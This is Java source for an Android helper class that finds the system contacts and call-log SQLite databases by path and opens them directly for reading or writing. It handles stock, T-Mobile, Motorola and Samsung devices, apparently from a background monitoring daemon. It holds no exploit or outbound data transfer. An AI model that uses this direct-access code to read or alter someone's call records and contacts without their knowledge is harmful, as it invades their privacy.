package com.vvt.contacts;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;

import com.vvt.daemon.util.Customization;
import com.vvt.database.VtDatabaseHelper;
import com.vvt.logger.FxLog;

public class ContactsDatabaseHelper {
	
	private static final String TAG = "ContactsDatabaseHelper";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String DEFAULT_PACKAGE_NAME = "com.android.providers.contacts";
	private static final String TMOBILE_PACKAGE_NAME = "com.tmobile.myfaves";
	private static final String SAMSUNG_LOG_PKG_NAME = "com.sec.android.provider.logsprovider";
	private static final String MOTO_BLUR_PACKAGE_NAME = "com.motorola.blur.providers.contacts";
	
	public static final String CONTACTS_DB_NAME_IN_CUPCAKE = "contacts.db";
	public static final String CONTACTS_DB_NAME_IN_ECLAIR = "contacts2.db";
	public static final String LOGS_DB_NAME_IN_SAMSUNG = "logs.db";
	
	public static final String TABLE_CALLS = "calls";
	public static final String TABLE_DATA = "data";
	public static final String TABLE_PHONES = "phones";
	public static final String TABLE_PEOPLE = "people";
	public static final String TABLE_CONTACT_METHODS = "contact_methods";
	public static final String TABLE_PHONE_LOOKUP = "phone_lookup";
	public static final String TABLE_NAME_LOOKUP = "name_lookup";
	public static final String TABLE_RAW_CONTACTS = "raw_contacts";
	public static final String TABLE_LOGS = "logs";
	
	public static final String COLUMN_ID = "_id";
	public static final String COLUMN_PERSON = "person";
	public static final String COLUMN_DATA = "data";
	public static final String COLUMN_DATA_ID = "data_id";
	public static final String COLUMN_DATA_1 = "data1";
	public static final String COLUMN_NUMBER = "number";
	public static final String COLUMN_DATE = "date";
	public static final String COLUMN_DURATION = "duration";
	public static final String COLUMN_TYPE = "type";
	public static final String COLUMN_NEW = "new";
	public static final String COLUMN_NAME = "name";
	public static final String COLUMN_NUMBERTYPE = "numbertype";
	public static final String COLUMN_NUMBERLABEL = "numberlabel";
	public static final String COLUMN_LOGTYPE = "logtype";
	
	public static final String COLUMN_CONTACT_ID = "contact_id";
	public static final String COLUMN_RAW_CONTACT_ID = "raw_contact_id";
	public static final String COLUMN_NORMALIZED_NUMBER = "normalized_number";
	public static final String COLUMN_DISPLAY_NAME = "display_name";
	
	private static String sContactsDbPath = null;
	private static String sLogsDbPath = null;
	
	public static SQLiteDatabase getReadableDatabase(boolean openLog) {
		return openDatabase(SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS, 
				openLog);
	}
	
	public static SQLiteDatabase getWritableDatabase() {
		return openDatabase(SQLiteDatabase.OPEN_READWRITE | SQLiteDatabase.NO_LOCALIZED_COLLATORS, 
				false);
	}
	
	private static SQLiteDatabase openDatabase(int flags, boolean openLog) {
		if (openLog && sLogsDbPath == null) {
			sLogsDbPath = getLogsDatabasePath();
			if (LOGV) FxLog.v(TAG, String.format("openDatabase # sLogsDbPath: %s", sLogsDbPath));
		}
		if (!openLog && sContactsDbPath == null) {
			sContactsDbPath = getContactsDatabasePath();
			if (LOGV) FxLog.v(TAG, String.format("openDatabase # sContactsDbPath: %s", sContactsDbPath));
		}
		
		String dbPath = openLog ? sLogsDbPath : sContactsDbPath;
		
		SQLiteDatabase db = tryOpenDatabase(flags, dbPath);
		
		int attemptLimit = 5;
		while (db == null && attemptLimit > 0) {
			if (LOGV) FxLog.v(TAG, "Cannot open database. Retrying ...");
			SystemClock.sleep(1000);
			db = tryOpenDatabase(flags, dbPath);
			attemptLimit--;
		}
		
		return db;
	}
	
	private static SQLiteDatabase tryOpenDatabase(int flags, String dbPath) {
		SQLiteDatabase db = null;
		
		try {
			db = SQLiteDatabase.openDatabase(dbPath, null, flags);
		}
		catch (SQLiteException e) {
			if (LOGE) FxLog.e(TAG, String.format("tryOpenDatabase # Error: %s", e));
		}
		
		return db;
	}
	
	private static String getLogsDatabasePath() {
		String dbPath = VtDatabaseHelper.getSystemDatabasePath(SAMSUNG_LOG_PKG_NAME);
		if (dbPath != null) {
			return String.format("%s/%s", dbPath, LOGS_DB_NAME_IN_SAMSUNG);
		}
		return getContactsDatabasePath();
	}
	
	private static String getContactsDatabasePath() {
		String dbPath = VtDatabaseHelper.getSystemDatabasePath(DEFAULT_PACKAGE_NAME);
		if (dbPath == null) {
			dbPath = VtDatabaseHelper.getSystemDatabasePath(TMOBILE_PACKAGE_NAME);
		}
		if (dbPath == null) {
			dbPath = VtDatabaseHelper.getSystemDatabasePath(MOTO_BLUR_PACKAGE_NAME);
		}
		
		if (LOGV) FxLog.v(TAG, String.format("getContactsDatabasePath # dbPath: %s", dbPath));
		if (dbPath == null) {
			return null;
		}
		
		// Find database name
		File f = new File(dbPath);
		String[] fList = f == null ? null : f.list();
		List<String> contactsDbList = 
			fList == null ? new ArrayList<String>() : Arrays.asList(fList);
		
		String dbFileName = null;
		for (String db : contactsDbList) {
			if (db.startsWith("contacts") && db.endsWith(".db")) {
				dbFileName = db;
				break;
			}
		}
		
		if (LOGV) FxLog.v(TAG, String.format("getDatabasePath # dbFileName: %s", dbFileName));
		if (dbFileName == null) {
			return null;
		}
		
		// Construct full path
		String fullPath = String.format("%s/%s", dbPath, dbFileName);
		
		if (LOGV) FxLog.v(TAG, String.format("getDatabasePath # Result Path: %s", fullPath));
		return fullPath;
	}
}
